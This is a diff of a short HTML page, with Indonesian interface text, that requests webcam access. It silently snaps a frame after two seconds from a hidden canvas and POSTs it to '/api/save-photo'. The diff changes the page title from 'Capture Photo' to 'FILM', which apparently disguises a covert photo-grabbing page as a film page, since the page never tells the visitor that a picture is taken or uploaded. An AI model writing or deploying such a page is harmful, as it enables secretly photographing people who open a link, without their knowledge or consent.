@@ -2,36 +2,38 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Capture Photo</title>
+  <title>FILM</title>
 </head>
 <body>
   <h2>Akses Kamera</h2>
-  <video id="video" autoplay playsinline width="320" height="240"></video>
+  <video id="video" autoplay playsinline muted width="320" height="240"></video>
   <canvas id="canvas" width="320" height="240" style="display: none;"></canvas>
 
   <script>
-    const video = document.getElementById('video');
-    const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+    window.onload = function () {
+      const video = document.getElementById('video');
+      const canvas = document.getElementById('canvas');
+      const ctx = canvas.getContext('2d');
 
-    navigator.mediaDevices.getUserMedia({ video: true })
-      .then(stream => {
-        video.srcObject = stream;
+      navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+          video.srcObject = stream;
 
-        setTimeout(() => {
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-          const image = canvas.toDataURL('image/png');
+          setTimeout(() => {
+            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const image = canvas.toDataURL('image/png');
 
-          fetch('/api/save-photo', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ image })
-          });
+            fetch('/api/save-photo', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ image })
+            });
 
-          stream.getTracks().forEach(track => track.stop());
-        }, 2000);
-      })
-      .catch(e => alert('Kamera tidak bisa diakses: ' + e));
+            stream.getTracks().forEach(track => track.stop());
+          }, 2000);
+        })
+        .catch(e => alert('Kamera tidak bisa diakses: ' + e));
+    }
   </script>
 </body>
 </html>
